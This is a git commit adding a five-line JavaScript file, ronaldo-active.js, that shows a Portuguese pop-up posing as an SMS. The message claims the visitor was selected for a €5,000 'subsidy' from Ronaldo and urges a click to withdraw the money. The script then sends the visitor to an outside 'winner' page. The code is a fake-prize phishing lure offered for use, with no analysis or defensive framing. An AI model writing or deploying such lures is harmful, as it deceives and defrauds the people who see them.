6b2df8c148e21dd0427e97ed3b8af79d380f7eae
surepluger <adigunkola666@gmail.com>
2025-06-09 00:03:38 +0100

    Create ronaldo-active.js

---
+++ ronaldo-active.js
@@ -0,0 +1,5 @@
+var password = 'SAQUE € 5.000'
+password=prompt('SMS: Parabéns, você está entre os selecionados para receber o subsídio de € 5.000 do Ronaldo, clique em Ok para sacar dinheiro agora ','SAQUE € 5.000');
+if (password != 'SAQUE € 5.000') {
+location.href='https://sureplug.org/winner.html';
+}
